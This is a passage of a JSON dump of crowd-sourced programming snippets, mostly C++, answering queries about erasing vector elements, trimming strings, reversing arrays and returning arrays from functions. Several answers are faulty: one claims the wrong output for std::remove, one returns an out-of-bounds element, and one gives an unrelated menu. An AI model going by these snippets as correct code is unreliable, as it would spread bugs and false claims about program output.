    "description": "vector.erase(position) // remove certain position // or vector.erase(left,right) // remove positions within range \n#include<bits/stdc++.h> using namespace std; int main(){     vector<int> v;     //Insert values 1 to 10     v.push_back(20);     v.push_back(10);     v.push_back(30);     v.push_back(20);     v.push_back(40);     v.push_back(20);     v.push_back(10);      vector<int>::iterator new_end;     new_end = remove(v.begin(), v.end(), 20);      for(int i=0;i<v.size(); i++){         cout << v[i] << \" \";     }     //Prints [10 30 40 10]     return 0; } C++Copy\n",
    "reg_date": "2021-10-12T11:43:01.000Z"
  },
  {
    "id": 3524,
    "keyword": null,
    "link": null,
    "title": " remove element from c++",
    "description": "\t cout<<\"Add services:\"<<endl; \t cout<<\" services offered:\"<<endl; \t cout<<\" 1 - Airline Tickets (local and International)\"<<endl; \t cout<<\" 2 - Bus\"<<endl; \t cout<<\" 3 - Hostel Packages(local&International)\"<<endl; \t cout<<\" 4 - Ferry (Ocean Jet)\"<<endl; \t cout<<\" 5 - Mobile(Eload, Call cards, games, satellite portal, internet, others)\"<<endl; \t cout<<\" 6 - Visa Assistance\"<<endl;\n",
    "reg_date": "2021-10-12T11:43:01.000Z"
  },
  {
    "id": 3525,
    "keyword": null,
    "link": null,
    "title": " remove element from vector on condition c++",
    "description": "#include <algorithm> #include <vector>  // using the erase-remove idiom  std::vector<int> vec {2, 4, 6, 8}; int value = 8 // value to be removed vec.erase(std::remove(vec.begin(), vec.end(), value), vec.end());\nv.erase(std::remove_if(     v.begin(), v.end(),     [](const int& x) {          return x > 10; // put your condition here     }), v.end()); // therefore elements > 10 are removed, leaving only elements<= 10\n",
    "reg_date": "2021-10-12T11:43:01.000Z"
  },
  {
    "id": 3526,
    "keyword": null,
    "link": null,
    "title": " remove first element from vector c++",
    "description": "// Deletes the second element (vec[1]) vec.erase(vec.begin() + 1);  // Deletes the second through third elements (vec[1], vec[2]) vec.erase(vec.begin() + 1, vec.begin() + 3);\nstd::vector<int> vect;  vect.erase(vect.begin());\nvector.erase( vector.begin() + 3 ); // Deleting the fourth element\n// Deletes the first element from vector v v.erase(v.begin());\n// Deleting first element vector_name.erase(vector_name.begin());  // Deleting xth element from start vector_name.erase(vector_name.begin()+(x-1));  // Deleting from the last vector_name.pop_back();\n// Why not setup a lambda you can use again & again auto removeByIndex =    []<class T>(std::vector<T> &vec, unsigned int index) { \t// This is the meat & potatoes   \tvec.erase(vec.begin() + index); };  // Then you can throw whatever vector at it you desire std::vector<std::string> stringvec = {\"Hello\", \"World\"}; // Will remove index 1: \"World\" removeByIndex(stringvec, 1); // Vector of integers, we will use push_back std::vector<unsigned int> intvec; intvec.push_back(33); intvec.push_back(66); intvec.push_back(99); // Will remove index 2: 99 removeByIndex(intvec, 2);\n",
    "reg_date": "2021-10-12T11:43:02.000Z"
  },
  {
    "id": 3527,
    "keyword": null,
    "link": null,
    "title": " remove from unordered set c++",
    "description": "// By position:\titerator erase ( const_iterator position ); // By key:\t\tsize_type erase ( const key_type& k ); // By range:\titerator erase ( const_iterator first, const_iterator last );  myset.erase ( myset.begin() );                    // erasing by iterator myset.erase ( \"France\" );                         // erasing by key myset.erase ( myset.find(\"Japan\"), myset.end() ); // erasing by range\n",
    "reg_date": "2021-10-12T11:43:02.000Z"
  },
  {
    "id": 3528,
    "keyword": null,
    "link": null,
    "title": " remove item from layout",
    "description": "QLayoutItem* item; while ( ( item = layout->takeAt( 0 ) ) != NULL ) {     delete item->widget();     delete item; } delete m_view->layout();\n",
    "reg_date": "2021-10-12T11:43:02.000Z"
  },
  {
    "id": 3529,
    "keyword": null,
    "link": null,
    "title": " remove last character from string c++",
    "description": "#include <iostream> #include <string>   str.resize(str.size() - 1);\nst = myString.substr(0, myString.size()-1); \n",
    "reg_date": "2021-10-12T11:43:02.000Z"
  },
  {
    "id": 3530,
    "keyword": null,
    "link": null,
    "title": " remove last letter in string c++",
    "description": "#include <iostream> #include <string>   str.resize(str.size() - 1);\n",
    "reg_date": "2021-10-12T11:43:02.000Z"
  },
  {
    "id": 3531,
    "keyword": null,
    "link": null,
    "title": " remove or erase first and last character of string c++",
    "description": "str.pop_back(); // removes last /back character from str str.erase(str.begin()); // removes first/front character from str\n",
    "reg_date": "2021-10-12T11:43:02.000Z"
  },
  {
    "id": 3532,
    "keyword": null,
    "link": null,
    "title": " remove something from stringstream",
    "description": " stringstream ss;  ss<<\"abc\\n\";  ss.seekp(-1, std::ios_base::end);  ss << '\\0';\n",
    "reg_date": "2021-10-12T11:43:02.000Z"
  },
  {
    "id": 3533,
    "keyword": null,
    "link": null,
    "title": " remove space in string c++",
    "description": "#include <algorithm>  int main() {     std::string str = \"H e l l o\";     str.erase(remove(str.begin(), str.end(), ' '), str.end());     std::cout << str; // Output Hello          return 0; }\nstatic std::string removeSpaces(std::string str) { \tstr.erase(remove(str.begin(), str.end(), ' '), str.end()); \treturn str; }\nstring removeSpaces(string str) {     stringstream s(str);     string temp;     str = \"\";     while (getline(s, temp, ' ')) {         str = str + temp;     }     return str; } //Input: Ha Noi Viet Nam //Output: HaNoiVietNam\n",
    "reg_date": "2021-10-12T11:43:02.000Z"
  },
  {
    "id": 3534,
    "keyword": null,
    "link": null,
    "title": " remove specific element from vector c++",
    "description": "vector.erase( vector.begin() + 3 ); // Deleting the fourth element\n// Deleting first element vector_name.erase(vector_name.begin());  // Deleting xth element from start vector_name.erase(vector_name.begin()+(x-1));  // Deleting from the last vector_name.pop_back();\nvector.erase(position) // remove certain position // or vector.erase(left,right) // remove positions within range \nremove(v.begin(),v.end(),val)\n#include<bits/stdc++.h> using namespace std; int main(){     vector<int> v;     //Insert values 1 to 10     v.push_back(20);     v.push_back(10);     v.push_back(30);     v.push_back(20);     v.push_back(40);     v.push_back(20);     v.push_back(10);      vector<int>::iterator new_end;     new_end = remove(v.begin(), v.end(), 20);      for(int i=0;i<v.size(); i++){         cout << v[i] << \" \";     }     //Prints [10 30 40 10]     return 0; } C++Copy\ntemplate <typename T> void remove(std::vector<T>& vec, size_t pos) {     std::vector<T>::iterator it = vec.begin();     std::advance(it, pos);     vec.erase(it); }\n",
    "reg_date": "2021-10-12T11:43:02.000Z"
  },
  {
    "id": 3535,
    "keyword": null,
    "link": null,
    "title": " remove the last element of a vector in cpp",
    "description": "vectorname.pop_back();\nNot Possible because C++ array has fixed size\n",
    "reg_date": "2021-10-12T11:43:02.000Z"
  },
  {
    "id": 3536,
    "keyword": null,
    "link": null,
    "title": " remove value from vector c++",
    "description": "//wiki - erase-remove idiom // Use g++ -std=c++11 or clang++ -std=c++11 to compile.  #include <algorithm>  // remove and remove_if #include <iostream> #include <vector>  // the general-purpose vector container  void Print(const std::vector<int>& vec) {   for (const auto& i : vec) {     std::cout << i << ' ';   }   std::cout << '\\n'; }  int main() {   // Initializes a vector that holds numbers from 0-9.   std::vector<int> v = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9};   Print(v);    // Removes all elements with the value 5.   v.erase(std::remove(v.begin(), v.end(), 5), v.end());   Print(v); }  /* Output: 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 6 7 8 9  */\n#include <algorithm> #include <vector>  // using the erase-remove idiom  std::vector<int> vec {2, 4, 6, 8}; int value = 8 // value to be removed vec.erase(std::remove(vec.begin(), vec.end(), value), vec.end());\nstd::vector<int> v;  // fill it up somehow v.erase(std::remove(v.begin(), v.end(), 99), v.end());  // really remove all elements with value 99\nvector.erase(position) // remove certain position // or vector.erase(left,right) // remove positions within range \n  // erase element from vector by its index     vector<string> strs {\"first\", \"second\", \"third\", \"last\"};            string element = \"third\"; // the element which will be erased     for(int i=0;i<strs.size();i++)     {       if(strs[i] == element)       strs.erase(strs.begin()+i);     }      \n// Why not setup a lambda you can use again & again auto removeByIndex =    []<class T>(std::vector<T> &vec, unsigned int index) { \t// This is the meat & potatoes   \tvec.erase(vec.begin() + index); };  // Then you can throw whatever vector at it you desire std::vector<std::string> stringvec = {\"Hello\", \"World\"}; // Will remove index 1: \"World\" removeByIndex(stringvec, 1); // Vector of integers, we will use push_back std::vector<unsigned int> intvec; intvec.push_back(33); intvec.push_back(66); intvec.push_back(99); // Will remove index 2: 99 removeByIndex(intvec, 2);\n",
    "reg_date": "2021-10-12T11:43:03.000Z"
  },
  {
    "id": 3537,
    "keyword": null,
    "link": null,
    "title": " removing a character from a string in c++",
    "description": "#include<iostream> #include<algorithm>  using namespace std; main() {    string my_str = \"ABAABACCABA\";     cout << \"Initial string: \" << my_str << endl;     my_str.erase(remove(my_str.begin(), my_str.end(), 'A'), my_str.end()); //remove A from string    cout << \"Final string: \" << my_str; }\n// string::erase #include <iostream> #include <string>  int main () {   std::string str (\"This is an example sentence.\");   std::cout << str << '\\n';                                            // \"This is an example sentence.\"   str.erase (10,8);                        //            ^^^^^^^^   std::cout << str << '\\n';                                            // \"This is an sentence.\"   str.erase (str.begin()+9);               //           ^   std::cout << str << '\\n';                                            // \"This is a sentence.\"   str.erase (str.begin()+5, str.end()-9);  //       ^^^^^   std::cout << str << '\\n';                                            // \"This sentence.\"   return 0; }\n#include <iostream> #include <algorithm> #include <string>   int main() {     std::string s = \"This is an example\";     std::cout << s << '\\n';       s.erase(0, 5); // Erase \"This \"     std::cout << s << '\\n';       s.erase(std::find(s.begin(), s.end(), ' ')); // Erase ' '     std::cout << s << '\\n';       s.erase(s.find(' ')); // Trim from ' ' to the end of the string     std::cout << s << '\\n'; }\n",
    "reg_date": "2021-10-12T11:43:03.000Z"
  },
  {
    "id": 3538,
    "keyword": null,
    "link": null,
    "title": " removing element from vector while iterating c++",
    "description": "#include <iostream> #include <vector> #include <algorithm>   int main() {     std::vector<int> v = { 1, 2, 3, 4, 5, 6 };       auto it = v.begin();     while (it != v.end())     {         // specify condition for removing element; in this case remove odd numbers         if (*it & 1) {             // erase() invalidates the iterator, use returned iterator             it = v.erase(it);         }         // Notice that iterator is incremented only on the else part (why?)         else {             ++it;         }     }       for (int const &i: v) {         std::cout << i << ' ';     }       return 0; } \n",
    "reg_date": "2021-10-12T11:43:03.000Z"
  },
  {
    "id": 3539,
    "keyword": null,
    "link": null,
    "title": " repeat character n times c++",
    "description": "auto five_repeated_dots = std::string(5, '.');\n",
    "reg_date": "2021-10-12T11:43:03.000Z"
  },
  {
    "id": 3540,
    "keyword": null,
    "link": null,
    "title": " replace a char in string c++ at a specific index",
    "description": "\tstring a = \"lol\"; \ta[2] = 'j'; \tcout << a; //output: loj\n",
    "reg_date": "2021-10-12T11:43:03.000Z"
  },
  {
    "id": 3541,
    "keyword": null,
    "link": null,
    "title": " replace komma with space C++",
    "description": "replace(str.begin(), str.end(), ',', ' ');  # include <algorithm> but works without\n",
    "reg_date": "2021-10-12T11:43:03.000Z"
  },
  {
    "id": 3542,
    "keyword": null,
    "link": null,
    "title": " request for member ‘push back’ in ‘matrix’, which is of non-class type ‘std::vector<int>()’",
    "description": "vector<char> string1; \n",
    "reg_date": "2021-10-12T11:43:03.000Z"
  },
  {
    "id": 3543,
    "keyword": null,
    "link": null,
    "title": " residuo en lenguaje c",
    "description": "#include <iostream>                           //Solo requeriremos de la biblioteca \"iostream\"   using namespace std;    int main() {     int divs = 8;                             //Este sera nuestro divisor     int divd = 100;                           //Este nuestro dividendo     int result, resid;           result = divd / divs;                      //Aqui realizamos la operacion de la divisi&oacute;n     resid = divd % divs;                       //Y aqui determinamos el modulo          cout << \"Resultado: \" << result << endl;  //Mostramos el resultado de la divisi&oacute;n     cout << \"Residuo: \" << resid;             // Y el residuo          return 0; } \n",
    "reg_date": "2021-10-12T11:43:03.000Z"
  },
  {
    "id": 3544,
    "keyword": null,
    "link": null,
    "title": " resize 2d vector c++",
    "description": "//vector<vector<int>> M; //int m = number of rows, n = number of columns; M.resize(m, vector<int>(n));\n myVector.resize(row_count, vector<int>(column_count, initialization_value)); //Example1: create a 2D integer vector with 5 rows and 5 columns having \"1\"  myVector.resize(5, vector<int>(5, 1)); //Ex2  myVector.resize(n);  for (int i = 0; i < n; ++i)      myVector[i].resize(m); \n",
    "reg_date": "2021-10-12T11:43:04.000Z"
  },
  {
    "id": 3545,
    "keyword": null,
    "link": null,
    "title": " resize two dimensional vector c++",
    "description": "//vector<vector<int>> M; //int m = number of rows, n = number of columns; M.resize(m, vector<int>(n));\n myVector.resize(row_count, vector<int>(column_count, initialization_value)); //Example1: create a 2D integer vector with 5 rows and 5 columns having \"1\"  myVector.resize(5, vector<int>(5, 1)); //Ex2  myVector.resize(n);  for (int i = 0; i < n; ++i)      myVector[i].resize(m); \n",
    "reg_date": "2021-10-12T11:43:04.000Z"
  },
  {
    "id": 3546,
    "keyword": null,
    "link": null,
    "title": " resizing dynamic array c++",
    "description": "void resize() {     size_t newSize = size * 2;     int* newArr = new int[newSize];      memcpy( newArr, arr, size * sizeof(int) );      size = newSize;     delete [] arr;     arr = newArr; } \n",
    "reg_date": "2021-10-12T11:43:04.000Z"
  },
  {
    "id": 3547,
    "keyword": null,
    "link": null,
    "title": " restting a queue stl",
    "description": "// To clear the queue Q defined as \"queue<int> Q\" Q = queue<int>();  \n",
    "reg_date": "2021-10-12T11:43:04.000Z"
  },
  {
    "id": 3548,
    "keyword": null,
    "link": null,
    "title": " result += a +b in c++ meaning",
    "description": "// compound assignment operators #include <iostream> using namespace std;  int main () {   int a, b=3;   a = b;   a+=2;             // equivalent to a=a+2   cout << a; }\n",
    "reg_date": "2021-10-12T11:43:04.000Z"
  },
  {
    "id": 3549,
    "keyword": null,
    "link": null,
    "title": " retourner pointeur de type qstringlist qt",
    "description": "no need to \"return\" a pointer of type QStringList or QString because it uses a shared pointer to store characters. Copy and assign operations are as efficient as manipulating pointers.\n",
    "reg_date": "2021-10-12T11:43:04.000Z"
  },
  {
    "id": 3550,
    "keyword": null,
    "link": null,
    "title": " retu7rn this c++",
    "description": "class myclass { public:    // Return by pointer needs const and non-const versions          myclass* ReturnPointerToCurrentObject()       { return this; }    const myclass* ReturnPointerToCurrentObject() const { return this; }     // Return by reference needs const and non-const versions          myclass& ReturnReferenceToCurrentObject()       { return *this; }    const myclass& ReturnReferenceToCurrentObject() const { return *this; }     // Return by value only needs one version.    myclass ReturnCopyOfCurrentObject() const { return *this; } };\n",
    "reg_date": "2021-10-12T11:43:04.000Z"
  },
  {
    "id": 3551,
    "keyword": null,
    "link": null,
    "title": " return 0; c++",
    "description": "// This example gives a reason why you should use using namespace std #include <iostream> using namespace std; cout << \"Hello \"<<endl; /* this one is shorter*/ // without the using namespace std you will need to use this std::cout <<\"Hello\"<<std::cout<<endl /* this one is longer  and it requires shorter amount of time */\n",
    "reg_date": "2021-10-12T11:43:04.000Z"
  },
  {
    "id": 3552,
    "keyword": null,
    "link": null,
    "title": " return an array in c++",
    "description": "#include <iostream>  using namespace std;     int* fun()  {      int* arr = new int[100];         /* Some operations on arr[] */     arr[0] = 10;      arr[1] = 20;         return arr;  }     int main()  {      int* ptr = fun();      cout << ptr[0] << \" \" << ptr[1];      return 0;  } \nint * fillarr(int arr[], int length){    for (int i = 0; i < length; ++i){       // arr[i] = ? // do what you want to do here    }    return arr; }  // then where you want to use it. int main(){ int arr[5]; int *arr2;  arr2 = fillarr(arr, 5);  } // at this point, arr & arr2 are basically the same, just slightly // different types.  You can cast arr to a (char*) and it'll be the same. \n#include <iostream> #include <ctime>  using namespace std;  // function to generate and retrun random numbers. int * getRandom( ) {     static int  r[10];     // set the seed    srand( (unsigned)time( NULL ) );        for (int i = 0; i < 10; ++i) {       r[i] = rand();       cout << r[i] << endl;    }     return r; }  // main function to call above defined function. int main () {     // a pointer to an int.    int *p;     p = getRandom();        for ( int i = 0; i < 10; i++ ) {       cout << \"*(p + \" << i << \") : \";       cout << *(p + i) << endl;    }     return 0; }\n",
    "reg_date": "2021-10-12T11:43:05.000Z"
  },
  {
    "id": 3553,
    "keyword": null,
    "link": null,
    "title": " return array from function c++",
    "description": "#include <iostream>  using namespace std;     int* fun()  {      int* arr = new int[100];         /* Some operations on arr[] */     arr[0] = 10;      arr[1] = 20;         return arr;  }     int main()  {      int* ptr = fun();      cout << ptr[0] << \" \" << ptr[1];      return 0;  } \nint * fillarr(int arr[], int length){    for (int i = 0; i < length; ++i){       // arr[i] = ? // do what you want to do here    }    return arr; }  // then where you want to use it. int main(){ int arr[5]; int *arr2;  arr2 = fillarr(arr, 5);  } // at this point, arr & arr2 are basically the same, just slightly // different types.  You can cast arr to a (char*) and it'll be the same. \n#include <iostream> #include <ctime>  using namespace std;  // function to generate and retrun random numbers. int * getRandom( ) {     static int  r[10];     // set the seed    srand( (unsigned)time( NULL ) );        for (int i = 0; i < 10; ++i) {       r[i] = rand();       cout << r[i] << endl;    }     return r; }  // main function to call above defined function. int main () {     // a pointer to an int.    int *p;     p = getRandom();        for ( int i = 0; i < 10; i++ ) {       cout << \"*(p + \" << i << \") : \";       cout << *(p + i) << endl;    }     return 0; }\nstring* getNames() {  string* names = new string[3];  names[0] = \"Simon\";  names[1] = \"Peter\";  names[2] = \"Dave\";    return names; } \n",
    "reg_date": "2021-10-12T11:43:05.000Z"
  },
  {
    "id": 3554,
    "keyword": null,
    "link": null,
    "title": " return array of string in function c++",
    "description": "#include <iostream> #include <ctime>  using namespace std;  // function to generate and retrun random numbers. int * getRandom( ) {     static int  r[10];     // set the seed    srand( (unsigned)time( NULL ) );        for (int i = 0; i < 10; ++i) {       r[i] = rand();       cout << r[i] << endl;    }     return r; }  // main function to call above defined function. int main () {     // a pointer to an int.    int *p;     p = getRandom();        for ( int i = 0; i < 10; i++ ) {       cout << \"*(p + \" << i << \") : \";       cout << *(p + i) << endl;    }     return 0; }\nstring* getNames() {  string* names = new string[3];  names[0] = \"Simon\";  names[1] = \"Peter\";  names[2] = \"Dave\";    return names; } \ndelete[] names; \n",
    "reg_date": "2021-10-12T11:43:05.000Z"
  },
  {
    "id": 3555,
    "keyword": null,
    "link": null,
    "title": " return function in cpp",
    "description": "Return statement. The return statement stops execution and returns to the calling function. When a return statement is executed, the function is terminated immediately at that point, regardless of whether it's in the middle of a loop, etc. \nvoid printChars(char c, int count) {     for (int i=0; i<count; i++) {        cout << c;     }//end for         return;  // Optional because it's a void function }//end printChars \n// Multiple return statements often increase complexity. int max(int a, int b) {     if (a > b) {         return a;     } else {         return b;     } }//end max \n// Single return at end often improves readability. int max(int a, int b) {     int maxval;     if (a > b) {         maxval = a;     } else {         maxval = b;     }     return maxval; }//end max \n",
    "reg_date": "2021-10-12T11:43:05.000Z"
  },
  {
    "id": 3556,
    "keyword": null,
    "link": null,
    "title": " return multiple objects from a function C++ using references",
    "description": "#include <iostream> using namespace std; void div(int a, int b, int &quotient, int &remainder) {    quotient = a / b;    remainder = a % b; } main() {    int a = 76, b = 10;    int q, r;    div(a, b, q, r);    cout << \"Quotient is: \"<< q <<\"\\nRemainder is: \"<< r <<\"\\n\"; }\n",
    "reg_date": "2021-10-12T11:43:05.000Z"
  },
  {
    "id": 3557,
    "keyword": null,
    "link": null,
    "title": " return odd numbers c++",
    "description": "#include<iostream> int copyOdd (int A[], int sizeA, int B[]); int main () {     int arr [] {1,2,3,4,5,6,7,8,9,10};     int Odd [5] {0,0,0,0,0};     copyOdd(arr,9,Odd);           for(int i = 0 ; i < 5; ++i)     {         std::cout<<Odd[i]<<' ';     }     std::cout<<std::endl;      return 0 ;  }  int copyOdd (int A[], int sizeA, int B[]) {        int j {0};     B [5];     for(int i  = 0 ; i < sizeA ; ++i)     {         if(A[i]%2 == 1)             B[j++] = A[i];                  }      return B[5]; }\n",
    "reg_date": "2021-10-12T11:43:06.000Z"
  },
  {
    "id": 3558,
    "keyword": null,
    "link": null,
    "title": " return odd numbers c++ for loop",
    "description": "#include<iostream> int copyOdd (int A[], int sizeA, int B[]);    int main () {     int arr [] {1,2,3,4,5,6,7,8,9,10};     int Odd [5] {0,0,0,0,0};     copyOdd(arr,9,Odd);           for(int i = 0 ; i < 5; ++i)     {         std::cout<<Odd[i]<<' ';     }     std::cout<<std::endl;      return 0 ;  }  int copyOdd (int A[], int sizeA, int B[]) {        int j {0};     B [5];     for(int i  = 0 ; i < sizeA ; ++i)     {         if(A[i]%2 == 1)             B[j++] = A[i];                  }      return B[5]; }\n",
    "reg_date": "2021-10-12T11:43:06.000Z"
  },
  {
    "id": 3559,
    "keyword": null,
    "link": null,
    "title": " return the index where maximum element in a vector",
    "description": "// my linkedin : https://www.linkedin.com/in/vaalarivan-prasanna-3a07bb203/ cout << distance(vec.begin(), max_element(vec.begin(), vec.end()));\n",
    "reg_date": "2021-10-12T11:43:06.000Z"
  },
  {
    "id": 3560,
    "keyword": null,
    "link": null,
    "title": " return tuple or null",
    "description": "# return tuple or null def solve s,g    s % g != 0 ? -1 : [g, s - g] end # FYI: the problem to solve is: # Given the sum and gcd of two numbers, return the two numbers in ascending order. \n// return tuple or null using namespace std;  pair<int, int> solve(int s, int g){       return (s % g != 0) ? make_pair(-1, -1) : make_pair(g, s - g);   } // FYI: the problem to solve is: // Given the sum and gcd of two numbers, return the two numbers in ascending order.  \npackage kata  func Solve(s int, g int) []int {   if s % g != 0 {     return []int{-1, -1}   }   return []int{g, s - g} } // FYI: the problem to solve is: // Given the sum and gcd of two numbers, return the two numbers in ascending order. \n// return a tuple or null fn solve(sum: u32, gcd: u32) -> Option<(u32, u32)> {     if sum % gcd != 0 {         None     } else {         Some((gcd, sum - gcd))     } } // FYI: the problem solved is: // Given the sum and gcd of two numbers, return the two numbers in ascending order. \n// return tuple or null #include <stdlib.h>  int *gdc_sum(int sum, int gcd) {   int   *res = malloc(sizeof(int) * 2);   res[0] = gcd;   res[1] = sum - gcd;   return sum % gcd != 0 ? (NULL) : (res); } // FYI: the problem to solve is: // Given the sum and gcd of two numbers, return the two numbers in ascending order. \n",
    "reg_date": "2021-10-12T11:43:06.000Z"
  },
  {
    "id": 3561,
    "keyword": null,
    "link": null,
    "title": " return use in c++",
    "description": "Terminates the execution of a function and returns control to the calling function (or to the operating system if you transfer control from the main function). Execution resumes in the calling function at the point immediately following the call\nvoid printChars(char c, int count) {     for (int i=0; i<count; i++) {        cout << c;     }//end for         return;  // Optional because it's a void function }//end printChars \n// Multiple return statements often increase complexity. int max(int a, int b) {     if (a > b) {         return a;     } else {         return b;     } }//end max \n// Single return at end often improves readability. int max(int a, int b) {     int maxval;     if (a > b) {         maxval = a;     } else {         maxval = b;     }     return maxval; }//end max \n",
    "reg_date": "2021-10-12T11:43:06.000Z"
  },
  {
    "id": 3562,
    "keyword": null,
    "link": null,
    "title": " returning a vector in c++",
    "description": "std::vector<x>f();\n++ cCopy#include <iostream> #include <vector> #include <iterator>  using std::cout; using std::endl; using std::vector;  vector<int> multiplyByFour(vector<int> &arr) {     vector<int> mult;     mult.reserve(arr.size());      for (const auto &i : arr) {         mult.push_back(i * 4);     }     return mult; }  int main() {     vector<int> arr = {1,2,3,4,5,6,7,8,9,10};     vector<int> arrby4;      arrby4 = multiplyByFour(arr);      cout << \"arr    - | \";     copy(arr.begin(), arr.end(),          std::ostream_iterator<int>(cout,\" | \"));     cout << endl;     cout << \"arrby4 - | \";     copy(arrby4.begin(), arrby4.end(),          std::ostream_iterator<int>(cout,\" | \"));     cout << endl;       return EXIT_SUCCESS; } \n",
    "reg_date": "2021-10-12T11:43:06.000Z"
  },
  {
    "id": 3563,
    "keyword": null,
    "link": null,
    "title": " reverse() in c++",
    "description": "#include <bits/stdc++.h> // Vector #include <algorithm>  // Reverse  using namespace std;  int main() {     vector<int> nums{4,1,2,1,2};      reverse(nums.begin(), nums.end());     return 0; } \n#include <iostream> using namespace std; int main() {\t\t// While loop \tconst int SIZE = 9; \tint arr [SIZE]; \tcout << \"Enter numbers: \\n\"; \tfor (int i = 0; i < SIZE; i++) \t\tcin >> arr[i]; \tfor (int i = 0; i < SIZE; i++) \t\tcout << arr[i] << \"\\t\"; \tcout << endl; \tcout << \"Reversed Array:\\n\"; \tint temp, start = 0, end = SIZE-1; \twhile (start < end) \t{ \t\ttemp = arr[start]; \t\tarr[start] = arr[end]; \t\tarr[end] = temp; \t\tstart++; \t\tend--; \t} \tfor (int i = 0; i < SIZE; i++) \t\tcout << arr[i] << \"\\t\"; \tcout << endl;\t   \treturn 0; } \n#include <iostream> #include <algorithm> #include <vector> #include <iterator> using namespace std; int main() {     vector<int>a = {11,22,33,44,99,55};     reverse(a.begin(), a.end());     auto it = a.begin();     for(it= a.begin(); it!=a.end(); it++){         cout << *it << ' ';         } } \n#include <iostream> using namespace std; int main() { \tconst int SIZE = 9; \tint arr [SIZE]; \tcout << \"Enter numbers: \\n\"; \tfor (int i = 0; i < SIZE; i++) \t\tcin >> arr[i]; \tfor (int i = 0; i < SIZE; i++) \t\tcout << arr[i] << \"\\t\"; \tcout << endl; \tcout << \"Reversed Array:\\n\"; \tint end = SIZE - 1, temp; \tfor (int i = 0; i < end; i++) \t{ \t\ttemp = arr[i]; \t\tarr[i] = arr[end]; \t\tarr[end] = temp; \t\tend--; \t} \t/*\tReverse using while loop \tint temp, start = 0, end = SIZE-1; \twhile (start < end) \t{ \t\ttemp = arr[start]; \t\tarr[start] = arr[end]; \t\tarr[end] = temp; \t\tstart++; \t\tend--; \t}*/ \tfor (int i = 0; i < SIZE; i++) \t\tcout << arr[i] << \"\\t\"; \tcout << endl;\t \t} \nvector<int> a = {1,2,3,4,5,6}; reverse(a.begin(), a.end());\n//Reverse vector partially (from index x to index y) reverse(v.begin()+x, v.begin()+y+1);\n",
    "reg_date": "2021-10-12T11:43:07.000Z"
  },
  {
    "id": 3564,
    "keyword": null,
    "link": null,
    "title": " reverse",
    "description": "// Iterative C++ program to reverse an array #include <bits/stdc++.h> using namespace std;  /* Function to reverse arr[] from start to end*/ void rvereseArray(int arr[], int start, int end) { \twhile (start < end) \t{ \t\tint temp = arr[start]; \t\tarr[start] = arr[end]; \t\tarr[end] = temp; \t\tstart++; \t\tend--; \t} }\t  /* Utility function to print an array */ void printArray(int arr[], int size) { for (int i = 0; i < size; i++) cout << arr[i] << \" \";  cout << endl; }  /* Driver function to test above functions */ int main() { \tint arr[] = {1, 2, 3, 4, 5, 6}; \t \tint n = sizeof(arr) / sizeof(arr[0]);  \t// To print original array \tprintArray(arr, n); \t \t// Function calling \trvereseArray(arr, 0, n-1); \t \tcout << \"Reversed array is\" << endl; \t \t// To print the Reversed array \tprintArray(arr, n); \t \treturn 0; } \n#include<stdio.h> #include<ctype.h> // to use system defined function islower & toupper  int main() {     printf(\"\\n\\n\\t\\tStudytonight - Best place to learn\\n\\n\\n\");      char alphabet;     printf(\"Enter an alphabet : \");     putchar('\\n');  // to move to next Line      alphabet=getchar();      printf(\"\\n\\nReverse case of %c is :  \",alphabet);      if(islower(alphabet))         putchar(toupper(alphabet));      else          // must be an uppercase character         printf(\"%c\",tolower(alphabet)) ;      printf(\"\\n\\n\\t\\t\\tCoding is Fun !\\n\\n\\n\");     return 0; }\n",
    "reg_date": "2021-10-12T11:43:07.000Z"
  },
  {
    "id": 3565,
    "keyword": null,
    "link": null,
    "title": " reverse a linked list",
    "description": "/* public class ListNode {     public int val;     public ListNode next;     public ListNode(int x) { val = x; next = null; } } */  public static ListNode[] reverse_linked_list(ListNode head) {          ListNode prev = null;         ListNode current = head;         ListNode next;          ListNode tail = head;          while (current != null) {              next = current.next;             current.next = prev;             prev = current;             current = next;         }          head = prev;          ListNode[] result = {head, tail};          return result; }\n//Iterative program in C++ to reverse a linked list in groups of k  //\t(just before end of 2nd iteration of outer loop) [ 1->2->3->4->5->NULL ] // 1 <- 2    3 <- 4  5 ->NULL   (k=2)    ^\t\t ^\t\t ^    |\t\t |\t\t | prev_tail temp_head walker  void reverse_by_k(Node **head,int k){     Node* temp_head = *head,*walker = *head,*prev_tail = NULL;     while(walker){         int i=0;         Node *temp = NULL,*prev = NULL;         //initialize temporary head to set previous tail later         temp_head = walker;                  //reverse group of k nodes         while(i<k && walker){             temp = walker->next;             walker->next = prev;             prev = walker;             walker = temp;             i++;         }                  if(prev_tail){             //previous tail has to point to temporary head of current group             prev_tail->next = prev;             prev_tail = temp_head;         } else{             prev_tail = *head;             *head = prev;         }     } }\nclass recursion {  \tstatic Node head; // head of list  \tstatic class Node {  \t\tint data;  \t\tNode next;  \t\tNode(int d)  \t\t{   data = d;  \t\t\tnext = null; \t} }  \tstatic Node reverse(Node head)  \t{  \t\tif (head == null || head.next == null)  \t\t\treturn head;  \t\t/* reverse the rest list and put the first element          at the end */ \t\tNode rest = reverse(head.next);  \t\thead.next.next = head;  \t\t/* tricky step -- see the diagram */     \thead.next = null;  \t\t/* fix the head pointer */ \t\treturn rest;  \t}  /* Function to print linked list */ \tstatic void print()  \t{  \t\tNode temp = head;  \t\twhile (temp != null) {  \t\t\tSystem.out.print(temp.data + \" \");  \t\t\ttemp = temp.next;  \t\t}  \t\tSystem.out.println();  \t}  \tstatic void push(int data)  \t{  \t\tNode temp = new Node(data);  \t\ttemp.next = head;  \t\thead = temp;  \t} /* Driver program to test above function*/ public static void main(String args[])  {  \t/* Start with the empty list */ \tpush(20);  \tpush(4);  \tpush(15);  \tpush(85);  \tSystem.out.println(\"Given linked list\");  \tprint();  \thead = reverse(head);  \tSystem.out.println(\"Reversed Linked list\");  \tprint();  } } // This code is contributed by Prakhar Agarwal \n\t    /* Before changing next pointer of current node,         store the next node */         next = curr -> next         /*  Change next pointer of current node */         /* Actual reversing */         curr -> next = prev         /*  Move prev and curr one step ahead */         prev = curr         curr = next \n#include<bits/stdc++.h>   using namespace std;   struct node {     int data;     struct node *next; };   // To create a demo we have to construct a linked list and this  // function is to push the elements to the list.  void push(struct node **head_ref, int data) {     struct node *node;     node = (struct node*)malloc(sizeof(struct node));     node->data = data;     node->next = (*head_ref);     (*head_ref) = node; }   // Function to reverse the list void reverse(struct node **head_ref) {     struct node *temp = 